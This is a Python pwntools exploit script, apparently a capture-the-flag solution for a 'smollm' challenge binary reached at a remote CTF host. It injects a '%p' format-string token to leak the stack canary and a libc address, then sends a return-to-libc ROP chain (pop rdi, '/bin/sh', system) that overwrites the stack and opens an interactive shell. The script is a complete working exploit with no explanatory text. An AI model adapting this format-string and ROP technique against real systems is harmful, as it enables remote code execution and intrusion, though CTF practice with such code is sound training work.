from pwn import *
from pwnlib.tubes.tube import Timeout as PwnTimeout
import re
from typing import Optional, List

tokens = ["a",
    "about",
    "all",
    "also",
    "and",
    "as",
    "at",
    "be",
    "because",
    "but",
    "by",
    "can",
    "come",
    "could",
    "computer",
    "ctf",
    "day",
    "do",
    "even",
    "find",
    "first",
    "flux",
    "for",
    "from",
    "get",
    "give",
    "go",
    "hacklu",
    "have",
    "he",
    "her",
    "here",
    "him",
    "his",
    "how",
    "I",
    "if",
    "in",
    "into",
    "it",
    "its",
    "just",
    "know",
    "like",
    "look",
    "make",
    "man",
    "many",
    "me",
    "more",
    "mvm",
    "my",
    "new",
    "no",
    "not",
    "now",
    "of",
    "on",
    "one",
    "only",
    "or",
    "other",
    "our",
    "out",
    "people",
    "plfanzen",
    "say",
    "see",
    "she",
    "so",
    "some",
    "take",
    "tell",
    "than",
    "that",
    "the",
    "their",
    "them",
    "then",
    "there",
    "these",
    "they",
    "thing",
    "think",
    "this",
    "those",
    "time",
    "to",
    "two",
    "up",
    "use",
    "very",
    "want",
    "way",
    "we",
    "well",
    "what",
    "when",
    "which",
    "who",
    "will",
    "with",
    "would",
    "year",
    "you",
    "your"]

MAX_TOKENS = 256
n_tokens = len(tokens)
combinator = 0

context.bits = 64
context.arch = 'amd64'
if args.DEBUG:
  context.log_level = 'debug'

context.binary = "./smollm"

LIBC = ELF("./libc.so.6")

if args.REMOTE:
  p = remote("SMOLLM.flu.xxx", 1024)
else:
  p = process(["./smollm"])


def add_tokens(token):
  global tokens
  global n_tokens

  tokens.append(token)
  n_tokens+=1

  p.sendline(b"1")
  p.recvuntil(b'token?>')
  p.sendline(token)

  p.recvuntil(b"Do you want to")
  #print("Added:",token)

def get_token_index(token):
  global tokens
  return tokens.index(token)

def prepare_message(token_list):
  res = b""
  for i in range (len(token_list)):
    res += bytes([get_token_index(token_list[i]) - i - combinator])
  return res

def run_prompt(message):
  global combinator
  combinator += len(message) + 1

  #print("Sending:", message)
  p.recvuntil(b"Run a prompt\n>")
  p.sendline(b"2")
  p.recvuntil(b"How can I help you?\n>")
  p.sendline(message)

  try:
      return p.recvuntil(b"\nDo you want to", timeout=1.5)

  except EOFError:
      print("remote closed connection")
      raise
  except :
      print("timed out, moving on")
      return b""

def parse_elements(blob: bytes) -> List[Optional[str]]:
    s = blob.decode('latin-1')
    pattern = re.compile(r'(?:0x[0-9a-fA-F]+?(?=0x|\(nil\)|[^0-9a-fA-F]|$))|\(nil\)')
    elems = []
    for m in pattern.finditer(s):
        token = m.group(0)
        elems.append(None if token == '(nil)' else token.lower())
    return elems

def get_nth_element(blob: bytes, n: int) -> Optional[str]:
    elems = parse_elements(blob)
    if elems[n]:
      return p64(int(elems[n], 0))
    return None

def find_nth(string, substring, n):
   if (n == 1):
       return string.find(substring)
   else:
       return string.find(substring, find_nth(string, substring, n - 1) + 1)

def extract_leak(leak, n):
  res = leak[find_nth(leak.decode(), " ", n):][1:].decode()
  return p64(int(res[:find_nth(res, " ", 1)], 0))

leak_token = b"%p%p%p%p"
add_tokens(leak_token)

first_leak = run_prompt(prepare_message([leak_token]*31))
#print(first_leak)

canary_token = get_nth_element(first_leak, 69)
unknown = get_nth_element(first_leak, 70)
libc_address = u64(get_nth_element(first_leak, 81)) - 0x2a1ca

system = p64(LIBC.symbols['system'] + libc_address)
binsh = p64(next(LIBC.search(b"/bin/sh\x00"), None) + libc_address)
pop_rdi = p64(0x000000000010f78b + libc_address)
ret = p64(0x000000000002882f + libc_address)

print("Canary:",canary_token)
print("unknown:",unknown)
print("libc_address:",f"0x{libc_address:016x}")

add_tokens(canary_token)
add_tokens(unknown)
add_tokens(system)
add_tokens(binsh)
add_tokens(pop_rdi)
add_tokens(ret)

elements = [leak_token]*33+[canary_token, unknown, pop_rdi, binsh, ret, system]
run_prompt(prepare_message(elements))
p.interactive()
